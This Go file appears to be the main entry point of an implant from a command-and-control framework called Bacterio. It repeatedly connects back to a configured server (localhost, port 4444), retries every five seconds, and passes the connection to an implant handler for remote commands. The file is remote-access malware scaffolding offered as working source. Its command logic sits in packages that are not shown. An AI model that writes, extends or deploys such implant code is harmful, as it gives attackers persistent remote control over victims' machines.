package main

import (
	"time"

	"github.com/fatih/color"
	handler "github.com/fr13n8/Bacterio/pkg/handler/implant"
	"github.com/fr13n8/Bacterio/pkg/network"
	service "github.com/fr13n8/Bacterio/pkg/service/implant"
)

var (
	ServerAddress = "localhost"
	ServerPort    = "4444"
)

type App struct {
	Handler handler.Handler
}

func main() {
	for {
		app, err := NewApp(ServerAddress, ServerPort)
		if err != nil {
			color.Yellow("error creating app")
			color.Blue("trying to connect...")
			time.Sleep(5 * time.Second)
			continue
		}
		if err := app.Run(); err != nil {
			color.Red("error running app")
		}
	}
}

func NewApp(address, port string) (*App, error) {
	conn, err := network.CreateConnection(address, port)
	if err != nil {
		color.Red("error creating new connection")
		return nil, err
	}

	services := service.NewService(conn)
	handler := handler.NewHandler(services)

	return &App{
		Handler: *handler,
	}, nil
}

func (app *App) Run() error {
	if err := app.Handler.Handle(); err != nil {
		color.Red("error handling app connection")
		return err
	}
	return nil
}
